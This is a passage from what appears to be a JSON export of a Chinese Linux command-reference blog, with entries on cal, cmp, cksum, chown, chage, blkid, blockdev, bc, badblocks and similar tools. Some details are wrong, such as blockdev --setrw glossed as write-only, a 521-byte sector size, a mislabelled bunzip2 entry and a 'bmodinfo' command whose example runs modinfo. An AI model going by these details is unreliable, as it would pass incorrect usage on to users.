世纪初才认可它）。那天之后的 10 天在这项改革被略去了, 所以那个月的日历有点不太寻常。 语法 cal [ -mjy ] [ 月份 ] [ 年份 ] 选项 -l # 显示单月输出； -3 # 显示临近三个月的日历； -s # 将星期日作为月的第一天； -m # 显示星期一作为一周的第一天.. (缺省为星期日.) -j # 显示儒略历的(Julian)日期 (以 1 为基的天数, 从 1 月 1 日开始计数) . -y # 显示当前年份的日历.. 参数 月：指定月份； 年：指定年份。 实例 单独执行cal命令会打印出日历： [root@localhost ~]# cal February 2022 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 [root@localhost ~]# cal -j February 2022 Su Mo Tu We Th Fr Sa 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 [root@localhost ~]# cal -3 2022 January February March Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 1 2 3 4 5 1 2 3 4 5 2 3 4 5 6 7 8 6 7 8 9 10 11 12 6 7 8 9 10 11 12 9 10 11 12 13 14 15 13 14 15 16 17 18 19 13 14 15 16 17 18 19 16 17 18 19 20 21 22 20 21 22 23 24 25 26 20 21 22 23 24 25 26 23 24 25 26 27 28 29 27 28 27 28 29 30 31 30 31 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cal","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cal/","stats":{"text":"3 min read","time":148000,"words":541,"minutes":3},"date":"2022-01-31 06:56:59","dateFormat":"2022-01-31"},{"content":"增强 .bz2 压缩包查看器。 补充说明 bzless 命令 是增强 .bz2 压缩包查看器，bzless 比 bzmore 命令功能更加强大。 语法 bzless (参数) 参数 文件：指定要分屏显示的 .bz2 压缩包。 ","tags":[],"title":"bzless","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzless/","stats":{"text":"1 min read","time":12000,"words":58,"minutes":1},"date":"2022-01-31 06:52:44","dateFormat":"2022-01-31"},{"content":"直接比较两个 .bz2 压缩包中文件的不同。 补充说明 bzdiff 命令用于直接比较两个 .bz2 压缩包中文件的不同，省去了解压缩后再调用 diff 命令的过程。 语法 bzdiff (参数) 参数 文件1：指定要比较的第一个 .bz2 压缩包。 文件2：指定要比较的第二个 .bz2 压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzdiff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzdiff/","stats":{"text":"1 min read","time":20000,"words":96,"minutes":1},"date":"2022-01-31 05:48:40","dateFormat":"2022-01-31"},{"content":"比较两个文件是否有差异。 补充说明 cmp 命令用来比较两个文件是否有差异。当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不通之处的字符和列数编号。若不指定任何文件名称或是所给予的文件名为 &quot;-&quot;，则 cmp 指令会从标准输入设备读取数据。 语法 cmp (选项) (参数) 选项 -c或--print-chars：除了标明差异处的十进制字码之外，一并显示该字符所对应字符； -i&lt;字符数目&gt;或--ignore-initial=&lt;字符数目&gt;：指定一个数目； -l或——verbose：标示出所有不一样的地方； -s或--quiet或——silent：不显示错误信息； -v或——version：显示版本信息； --help：在线帮助。 参数 目录：比较两个文件的差异。 实例 使用 cmp 命令比较文件 &quot;testfile&quot; 和文件 &quot;testfile1&quot; 两个文件，则输入下面的命令： cmp testfile testfile1 #比较两个指定的文件 在上述指令执行之前，使用 cat 命令查看两个指定的文件内容，如下所示： cat testfile #查看文件内容 Absncn 50 #显示文件“testfile” Asldssja 60 Jslkadjls 85 cat testfile1 #查看文件内容 Absncn 50 #显示文件“testfile1” AsldssjE 62 Jslkadjls 85 然后，再执行 cmp 命令，并返回比较结果，具体如下所示： cmp testfile testfile1 #比较两个文件 testfile testfile1 #有差异：第8字节，第2行 注意：在比较结果中，只能够显示第一比较结果。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cmp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cmp/","stats":{"text":"2 min read","time":92000,"words":410,"minutes":2},"date":"2022-01-31 02:04:54","dateFormat":"2022-01-31"},{"content":"检查文件的 CRC 是否正确。 补充说明 cksum 命令是检查文件的 CRC 是否正确，确保文件从一个系统传输到另一个系统的过程中不被损坏。这种方法要求校验和在源系统中被计算出来，在目的系统中又被计算一次，两个数字进行比较，如果校验和相等，则该文件被认为是正确传输了。 注意：CRC 是指一种排错检查方法，即循环冗余校验法。 指定文件交由 cksum 命令进行校验后，会返回校验结果供用户核对文件是否正确无误。若不指定任何文件名称或是所给予的文件名为&quot;-&quot;，则 cksum 命令会从标准输入设备中读取数据。 语法 cksum (选项) (参数) 选项 --help：在线帮助； --version：显示版本信息。 参数 文件：指定要计算校验的版本信息。 实例 使用 cksum 命令计算文件 testfile1 的完整性，输入如下命令： cksum testfile1 #对指定文件进行CRC校验 以上命令执行后，将输出校验码等相关的信息，具体输出信息如下所示： 1263453430 78 testfile1 #输出信息 上面的输出信息中，&quot;1263453430&quot;表示校验码，&quot;78&quot;表示字节数。 注意：如果文件中有任何字符被修改，都将改变计算后 CRC 校验码的值。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cksum","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cksum/","stats":{"text":"2 min read","time":77000,"words":365,"minutes":2},"date":"2022-01-30 19:52:05","dateFormat":"2022-01-30"},{"content":"用来变更文件或目录的拥有者或所属群组。 补充说明 chown 命令改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。 只有文件主和超级用户才可以便用该命令。 语法 chown (选项) (参数) 选项 -c或——changes：效果类似“-v”参数，但仅回报更改的部分； -f或--quite或——silent：不显示错误信息； -h或--no-dereference：只对符号连接的文件作修改，而不更改其他任何相关文件； -R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； -v或——version：显示指令执行过程； ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chown","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chown/","stats":{"text":"1 min read","time":53000,"words":254,"minutes":1},"date":"2022-01-30 19:40:06","dateFormat":"2022-01-30"},{"content":"用来变更文件或目录的所属群组。 补充说明 chgrp 命令 用来改变文件或目录所属的用户组。该命令用来改变指定文件所属的用户组。其中，组名可以是用户组的 id，也可以是用户组的组名。文件名可以 是由空格分开的要改变属组的文件列表，也可以是由通配符描述的文件集合。如果用户不是该文件的文件主或超级用户 (root)，则不能改变该文件的组。 在 UNIX 系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用 chgrp 指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。 语法 chgrp [选项][组群][文件|目录] 选项 -R 递归式地改变指定目录及其下的所有子目录和文件的所属的组 -c或——changes：效果类似“-v”参数，但仅回报更改的部分； -f或--quiet或——silent：不显示错误信息； -h或--no-dereference：只对符号连接的文件作修改，而不是该其他任何相关文件； -H如果命令行参数是一个通到目录的符号链接，则遍历符号链接 -R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理； -L遍历每一个遇到的通到目录的符号链接 -P不遍历任何符号链接（默认） -v或——verbose：显示指令执行过程； --reference=&lt;参考文件或目录&gt;：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同； 参数 组：指定新工作名称； 文件：指定要改变所属组的文件列表。多个文件或者目录之间使用空格隔开。 实例 将/usr/meng及其子目录下的所有文件的用户组改为 mengxin。 chgrp -R mengxin /usr/meng 更改文件 ah 的组群所有者为newuser [root@rhel ~]# chgrp newuser ah ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chgrp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chgrp/","stats":{"text":"2 min read","time":113000,"words":532,"minutes":2},"date":"2022-01-30 19:23:15","dateFormat":"2022-01-30"},{"content":"命令用于中断FTP连线并结束程序。 补充说明 bye 命令在 ftp 模式下，输入 bye 即可中断目前的连线作业，并结束 ftp 的执行。 语法 bye 实例 bye ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bye","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bye/","stats":{"text":"1 min read","time":11000,"words":53,"minutes":1},"date":"2022-01-30 19:20:55","dateFormat":"2022-01-30"},{"content":"创一个bz2文件压缩包。 补充说明 bunzip2 命令 解压缩由 bzip2 指令创建的&quot;.bz2&quot;压缩包。对文件进行压缩与解压缩。此命令类似于&quot;gzip/gunzip&quot;命令，只能对文件进行压缩。对于目录只能压缩目录下的所有文件，压缩完成后，在目录下生成以“.bz2”为后缀的压缩包。bunzip2 其实是 bzip2 的符号链接，即软链接，因此压缩解压都可以通过 bzip2 实现。 语法 bunzip2 (选项) (参数) 选项 -f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件； -k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数； -s或——small：降低程序执行时，内存的使用量； -v或——verbose：解压缩文件时，显示详细的信息； -l，--license，-V或——version：显示版本信息。 参数 .bz2 压缩包：指定需要解压缩的 .bz2 压缩包。 实例 将/opt目录下的 etc.zip、var.zip 和 backup.zip 进行压缩，设置压缩率为最高，同时在压缩完毕后不删除原始文件，显示压缩过程的详细信息。 bzip2 -9vk /opt/etc.zip /opt/var.zip /opt/backup.zip 压缩完毕后，在/opt下就会生成相应的 etc.zip.bz2、var.zip.bz2 和 backup.zip.bz2 文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bunzip2","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bunzip2/","stats":{"text":"2 min read","time":80000,"words":355,"minutes":2},"date":"2022-01-30 19:18:14","dateFormat":"2022-01-30"},{"content":"执行 bash 内建命令。 概要 builtin [shell-builtin [arg ...]] 主要用途 用于执行指定的 bash 内建命令。 builtin命令调用的 bash 内建命令优先于同名的外部命令及同名的 shell 函数。 参数 shell-builtin（可选）：要调用的 bash 内建命令。 arg（可选）：传递给 bash 内建命令的一到多个参数。 返回值 返回该内建命令执行的返回值，除非传递的不是bash内建命令或该内建命令被禁用。 例子 同名情况下的优先级顺序： builtin 内建命令 &gt; 函数 &gt; 内建命令 &gt; 外部命令 # 关于外部命令优先级最高的情况请参考enable命令。 # 此时内建命令优先使用 echo &quot;the Great Wall&quot; # 调用内建命令type，返回命令的类型（builtin） type -t echo # 定义 echo 函数 echo(){ printf &quot;123\\n&quot; } # 此时同名函数优先使用，显示（123） echo # 调用内建命令type，返回命令的类型（function） type -t echo # 此时内建命令优先使用 builtin echo -e &quot;backslash \\\\&quot; # 执行shell内部指令，输出当前系统下的命令别名 builtin alias alias cp='cp -i' alias l.='ls -d .* --color=tty' alias ll='ls -l --color=tty' alias ls='ls --color=tty' alias mv='mv -i' alias rm='rm -i' alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde' 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 如果要调用的内建命令被禁用了（包括builtin），那么执行会报错；关于禁用和启用内建命令请参考enable命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"builtin","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/builtin/","stats":{"text":"2 min read","time":97000,"words":400,"minutes":2},"date":"2022-01-30 19:16:27","dateFormat":"2022-01-30"},{"content":"结束for，while或until循环。 概要 break [n] 主要用途 结束for，while或until循环，可指定退出几层循环。 参数 n（可选）：大于等于1的整数，用于指定退出几层循环。 返回值 返回成功除非n小于1。 例子 # break的可选参数n缺省值为1。 # 从外层for循环继续执行。 for((i=3;i&gt;0;i--)); do for((j=3;j&gt;0;j--)); do if((j==2)); then # 换成break 1时结果一样 break fi printf &quot;%s %s\\n&quot; ${i} ${j} done done # 输出结果 3 3 2 3 1 3 # 当n为2时： # 退出两层循环，结束。 for((i=3;i&gt;0;i--)); do for((j=3;j&gt;0;j--)); do if((j==2)); then break 2 fi printf &quot;%s %s\\n&quot; ${i} ${j} done done # 输出结果 3 3 注意 该命令是bash内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"break","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/break/","stats":{"text":"1 min read","time":58000,"words":214,"minutes":1},"date":"2022-01-30 19:15:12","dateFormat":"2022-01-30"},{"content":"显示给定模块的详细信息。 补充说明 bmodinfo 命令用于显示给定模块的详细信息。 语法 bmodinfo (选项) (参数) 选项 -a：显示模块作者； -d：显示模块的描述信息； -l：显示模块的许可信息； -p：显示模块的参数信息； -n：显示模块对应的文字信息； -0：用ASCII码的0字符分割字段值，而不使用新行。 参数 模块名：要显示详细信息的模块名称。 实例 显示sg模块的信息： [root@localhost ~]# modinfo sg filename: /lib/modules/2.6.9-42.ELsmp/kernel/drivers/scsi/sg.ko author: Douglas Gilbert description: SCSI generic (sg) driver license: GPL version: 3.5.31 B0B0CB1BB59F0669A1F0D6B parm: def_reserved_size:size of buffer reserved for each fd parm: allow_dio:allow direct I/O (default: 0 (disallow)) alias: char-major-21-* vermagic: 2.6.9-42.ELsmp SMP 686 REGPARM 4KSTACKS gcc-3.4 depends: scsi_mod ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bmodinfo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bmodinfo/","stats":{"text":"1 min read","time":54000,"words":203,"minutes":1},"date":"2022-01-30 19:13:58","dateFormat":"2022-01-30"},{"content":"修改帐号和密码的有效期限。 补充说明 chage 命令是用来修改帐号和密码的有效期限。 语法 chage [选项] 用户名 选项 -m：密码可更改的最小天数。为零时代表任何时候都可以更改密码。 -M：密码保持有效的最大天数。 -w：用户密码到期前，提前收到警告信息的天数。 -E：帐号到期的日期。过了这天，此帐号将不可用。 -d：上一次更改的日期。 -i：停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。 -l：例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。 实例 可以编辑/etc/login.defs来设定几个参数，以后设置口令默认就按照参数设定为准： PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_MIN_LEN 5 PASS_WARN_AGE 7 当然在/etc/default/useradd可以找到如下 2 个参数进行设置： # useradd defaults file GROUP=100 HOME=/home INACTIVE=-1 EXPIRE= SHELL=/bin/bash SKEL=/etc/skel CREATE_MAIL_SPOOL=yes 通过修改配置文件，能对之后新建用户起作用，而目前系统已经存在的用户，则直接用 chage 来配置。 我的服务器 root 帐户密码策略信息如下： [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ：从不 密码失效时间 ：从不 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：99999 在密码过期之前警告的天数 ：7 我可以通过如下命令修改我的密码过期时间： [root@linuxde ~]# chage -M 60 root [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ： 5月 11, 2013 密码失效时间 ：从不 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：60 在密码过期之前警告的天数 ：9 然后通过如下命令设置密码失效时间： [root@linuxde ~]# chage -I 5 root [root@linuxde ~]# chage -l root 最近一次密码修改时间 ： 3月 12, 2013 密码过期时间 ： 5月 11, 2013 密码失效时间 ： 5月 16, 2013 帐户过期时间 ：从不 两次改变密码之间相距的最小天数 ：0 两次改变密码之间相距的最大天数 ：60 在密码过期之前警告的天数 ：9 从上述命令可以看到，在密码过期后 5 天，密码自动失效，这个用户将无法登陆系统了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"chage","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/chage/","stats":{"text":"3 min read","time":151000,"words":671,"minutes":3},"date":"2022-01-30 19:12:28","dateFormat":"2022-01-30"},{"content":"从命令行调用区块设备控制程序。 补充说明 blockdev命令在命令调用“ioxtls”函数，以实现对设备的控制。 语法 blockdev (选项) (参数) 选项 -V：打印版本号并退出； -q：安静模式； -v：详细信息模式； --setro：只读； --setrw：只写； --getro：打印只读状态，“1”表示只读，“0”表示非只读； --getss：打印扇区大小。通常为521； --flushbufs：刷新缓冲区； --rereadpt：重新读取分区表。 参数 设备文件名：指定要操作的磁盘的设备文件名。 实例 设置设备为只读： blockdev --setro /dev/hda4 读取设备是否为只读： blockdev --getro /dev/hda4 设置设别为可读写： blockdev --setrw /dev/hda4 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"blockdev","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/blockdev/","stats":{"text":"1 min read","time":39000,"words":176,"minutes":1},"date":"2022-01-30 19:12:14","dateFormat":"2022-01-30"},{"content":"查看块设备的文件系统类型、LABEL、UUID 等信息。 补充说明 在 Linux 下可以使用 blkid 命令 对查询设备上所采用文件系统类型进行查询。blkid 主要用来对系统的块设备（包括交换分区）所使用的文件系统类型、LABEL、UUID 等信息进行查询。要使用这个命令必须安装 e2fsprogs 软件包。 语法 blkid -L | -U blkid [-c ] [-ghlLv] [-o] [-s ][-t ] -[w ] [ ...] blkid -p [-s ] [-O ] [-S ][-o] ... blkid -i [-s ] [-o] ... 选项 -c &lt;file&gt; # 指定cache文件(default: /etc/blkid.tab, /dev/null = none) -d # don't encode non-printing characters -h # 显示帮助信息 -g # garbage collect the blkid cache -o &lt;format&gt; # 指定输出格式 -k # list all known filesystems/RAIDs and exit -s &lt;tag&gt; # 显示指定信息，默认显示所有信息 -t &lt;token&gt; # find device with a specific token (NAME=value pair) -l # look up only first device with token specified by -t -L &lt;label&gt; # convert LABEL to device name -U &lt;uuid&gt; # convert UUID to device name -v # 显示版本信息 -w &lt;file&gt; # write cache to different file (/dev/null = no write) &lt;dev&gt; # specify device(s) to probe (default: all devices) Low-level probing options: -p # low-level superblocks probing (bypass cache) -i # gather information about I/O limits -S &lt;size&gt; # overwrite device size -O &lt;offset&gt; # probe at the given offset -u &lt;list&gt; # filter by &quot;usage&quot; (e.g. -u filesystem,raid) -n &lt;list&gt; # filter by filesystem type (e.g. -n vfat,ext3) 实例 列出当前系统中所有已挂载文件系统的类型： sudo blkid 显示指定设备 UUID： sudo blkid -s UUID /dev/sda5 显示所有设备 UUID： sudo blkid -s UUID 显示指定设备 LABEL： sudo blkid -s LABEL /dev/sda5 显示所有设备 LABEL： sudo blkid -s LABEL 显示所有设备文件系统： sudo blkid -s TYPE 显示所有设备： sudo blkid -o device 以列表方式查看详细信息： sudo blkid -o list ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"blkid","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/blkid/","stats":{"text":"3 min read","time":129000,"words":442,"minutes":3},"date":"2022-01-30 19:06:07","dateFormat":"2022-01-30"},{"content":"显示或设置键盘按键与其相关的功能。 补充说明 bind 命令用于显示和设置命令行的键盘序列绑定功能。通过这一命令，可以提高命令行中操作效率。您可以利用 bind 命令了解有哪些按键组合与其功能，也可以自行指定要用哪些按键组合。 语法 bind (选项) 选项 -d：显示按键配置的内容； -f&lt;按键配置文件&gt;：载入指定的按键配置文件； -l：列出所有的功能； -m&lt;按键配置&gt;：指定按键配置； -q&lt;功能&gt;：显示指定功能的按键； -v：列出目前的按键配置与其功能。 实例 bind -x '&quot;\\C-l&quot;:ls -l' #直接按 CTRL+L 就列出目录 其中 keyseq 可以使用showkey -a命令来获取： [root@localhost ~]# showkey -a Press any keys - Ctrl-D will terminate this program ^[[A 27 0033 0x1b 上 91 0133 0x5b 65 0101 0x41 ^[[B 27 0033 0x1b 下 91 0133 0x5b 66 0102 0x42 ^[[D 27 0033 0x1b 左 91 0133 0x5b 68 0104 0x44 ^[[C 27 0033 0x1b 右 91 0133 0x5b 67 0103 0x43 32 0040 0x20 ^M 13 0015 0x0d 字母M ^C 3 0003 0x03 Ctrl-C ^D 4 0004 0x04 Ctrl-D 退出 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bind","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bind/","stats":{"text":"2 min read","time":77000,"words":297,"minutes":2},"date":"2022-01-30 19:03:21","dateFormat":"2022-01-30"},{"content":"将前台终端作业移动到后台运行。 概要 bg [job_spec ...] 主要用途 用于将作业放到后台运行，使前台可以执行其他任务。该命令的运行效果与在指令后面添加符号&amp;的效果是相同的，都是将其放到系统后台执行。 若后台任务中只有一个，则使用该命令时可以省略任务号。 参数 job_spec（可选）：指定要移动到后台执行的作业标识符，可以是一到多个。 返回值 返回成功除非未开启作业控制或发生了错误。 例子 # 运行sleep命令，然后按下ctrl+z。 sleep 60 ^Z [1]+ Stopped sleep 60 # 使用bg命令使得作业在后台运行。 bg %1 # 返回信息： [1]+ sleep 60 &amp; 注意 bash 的作业控制命令包括 bg fg kill wait disown suspend。 该命令需要 set 选项 monitor 处于开启状态时才能执行；查看作业控制状态：输入 set -o 查看 monitor 行；执行 set -o monitor 或 set -m 开启该选项。 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bg/","stats":{"text":"2 min read","time":64000,"words":289,"minutes":2},"date":"2022-01-30 18:55:03","dateFormat":"2022-01-30"},{"content":"查看 bzip2 压缩过的文本文件的内容。 补充说明 bzmore 命令用于查看 bzip2 压缩过的文本文件的内容，当下一屏显示不下时可以实现分屏显示。 语法 bzmore (参数) 参数 文件：指定要分屏显示的 .bz2 压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzmore","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzmore/","stats":{"text":"1 min read","time":15000,"words":75,"minutes":1},"date":"2022-01-30 18:53:40","dateFormat":"2022-01-30"},{"content":"算术操作精密运算工具。 补充说明 bc 命令是一种支持任意精度的交互执行的计算器语言。bash 内置了对整数四则运算的支持，但是并不支持浮点运算，而 bc 命令可以很方便的进行浮点运算，当然整数运算也不再话下。 语法 bc (选项) (参数) 选项 -i：强制进入交互式模式； -l：定义使用的标准数学库； -w：对POSIX bc的扩展给出警告信息； -q：不打印正常的GNU bc环境信息； -v：显示指令版本信息； -h：显示指令的帮助信息。 参数 文件：指定包含计算任务的文件。 实例 算术操作高级运算 bc 命令它可以执行浮点运算和一些高级函数： echo &quot;1.212*3&quot; | bc 3.636 设定小数精度（数值范围） echo &quot;scale=2;3/8&quot; | bc 0.37 参数scale=2是将 bc 输出结果的小数位设置为 2 位。 进制转换 #!/bin/bash abc=192 echo &quot;obase=2;$abc&quot; | bc 执行结果为：11000000，这是用 bc 将十进制转换成二进制。 #!/bin/bash abc=11000000 echo &quot;obase=10;ibase=2;$abc&quot; | bc 执行结果为：192，这是用 bc 将二进制转换为十进制。 计算平方和平方根： echo &quot;10^10&quot; | bc echo &quot;sqrt(100)&quot; | bc ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bc/","stats":{"text":"2 min read","time":82000,"words":344,"minutes":2},"date":"2022-01-30 18:52:30","dateFormat":"2022-01-30"},{"content":"在系统不繁忙的时候执行定时任务。 补充说明 batch 命令用于在指定时间，当系统不繁忙时执行任务，用法与 at 相似。 语法 batch (选项) (参数) 选项 -f：指定包含具体指令的任务文件； -q：指定新任务的队列名称； -m：任务执行完后向用户发送E-mail。 参数 日期时间：指定任务执行的日期时间。 实例 batch at&gt; echo 1234 at&gt; &lt;EOT&gt; job 5 at Sun Apr 28 08:49:00 2013 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"batch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/batch/","stats":{"text":"1 min read","time":31000,"words":133,"minutes":1},"date":"2022-01-30 18:51:18","dateFormat":"2022-01-30"},{"content":"恢复被破坏的.bz2压缩包中的文件。 补充说明 bzip2recover 命令可用于恢复被破坏的 .bz2 压缩包中的文件。 bzip2 是以区块的方式来压缩文件，每个区块视为独立的单位。因此，当某一区块损坏时，便可利用 bzip2recover，试着将文件中的区块隔开来，以便解压缩正常的区块。通常只适用在压缩文件很大的情况。 语法 bzip2recover (参数) 参数 文件：指定要恢复数据的.bz2压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzip2recover","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzip2recover/","stats":{"text":"1 min read","time":28000,"words":135,"minutes":1},"date":"2022-01-30 18:50:27","dateFormat":"2022-01-30"},{"content":"打印目录或者文件的基本名称。 补充说明 basename 命令用于打印目录或者文件的基本名称。basename 和 dirname 命令通常用于 shell 脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。 语法 basename (选项) (参数) 选项 --help：显示帮助； --version：显示版本号。 参数 文件：带路径信息的文件； 后缀：可选参数，指定要去除的文件后缀字符串。 实例 1、要显示一个shell变量的基本名称，请输入： basename $WORKFILE 此命令显示指定给 shell 变量 WORKFILE 的值的基本名称。如果 WORKFILE 变量的值是/home/jim/program.c文件，则此命令显示 program.c。 要构造一个和另一个文件名称相同（除了后缀）的文件名称，请输入： OFILE=`basename $1 .c`.o 此命令指定给 OFILE 文件第一个位置上的参数（$1）的值，但它的 .c 后缀更改至 .o。如果 $1 是 /home/jim/program.c 文件，则 OFILE 成为 program.o。因为 program.o 仅是一个基本文件名称，它标识在当前目录中的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"basename","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/basename/","stats":{"text":"2 min read","time":65000,"words":295,"minutes":2},"date":"2022-01-30 18:49:27","dateFormat":"2022-01-30"},{"content":"查找磁盘中损坏的区块。 补充说明 badblock 命令用于查找磁盘中损坏的区块。 硬盘是一个损耗设备，当使用一段时间后可能会出现坏道等物理故障。电脑硬盘出现坏道后，如果不及时更换或进行技术处理，坏道就会越来越多，并会造成频繁死机和数据丢失。最好的处理方式是更换磁盘，但在临时的情况下，应及时屏蔽坏道部分的扇区，不要触动它们。badblocks 就是一个很好的检查坏道位置的工具。 语法 badblock (选项) (参数) 选项 -b&lt;区块大小&gt;：指定磁盘的区块大小，单位为字节； -o&lt;输出文件&gt;：将检查的结果写入指定的输出文件； -s：在检查时显示进度； -v：执行时显示详细的信息； -w：在检查时，执行写入测试。 参数 磁盘装置：指定要检查的磁盘装置； 磁盘区块数：指定磁盘装置的区块总数； 启始区块：指定要从哪个区块开始检查。 实例 badblocks 以 4096 的一个 block，每一个 block 检查 16 次，将结果输出到“hda-badblocks-list”文件里。 badblocks -b 4096 -c 16 /dev/hda1 -o hda-badblocks-list hda-badblocks-list 是个文本文件，内容如下： cat hda-badblocks-list 51249 51250 51251 51253 51254 …… 61245 …… 可以针对可疑的区块多做几次操作。下面，badblocks 以 4096 字节为一个“block”,每一个“block”检查 1 次, 将结果输出到“hda-badblocks-list.1”文件中，由第 51000 block 开始，到 63000 block 结束。 badblocks -b 4096 -c 1 /dev/hda1 -o hda-badblocks-list.1 63000 51000 这次花费的时间比较短，硬盘在指定的情况下在很短的时间就产生“嘎嘎嘎嘎”的响声。由于检查条件的不同，其输出的结果也不完全是相同的。重复几次同样的操作，因条件多少都有些不同，所以结果也有所不同。进行多次操作后，直到产生最后的 hda-badblock-list.final 文件。 其他 1、fsck 使用 badblocks 的信息 badblocks 只会在日志文件中标记出坏道的信息，但若希望在检测磁盘时也能跳过这些坏块不检测，可以使用 fsck 的 -l 参数： fsck.ext3 -l /tmp/hda-badblock-list.final /dev/hda1 2、在创建文件系统前检测坏道 badblocks 可以随 e2fsck 和 mke2fs 的 -c 删除一起运行（对 ext3 文件系统也一样），在创建文件系统前就先检测坏道信息： mkfs.ext3 -c /dev/hda1 代码表示使用 -c 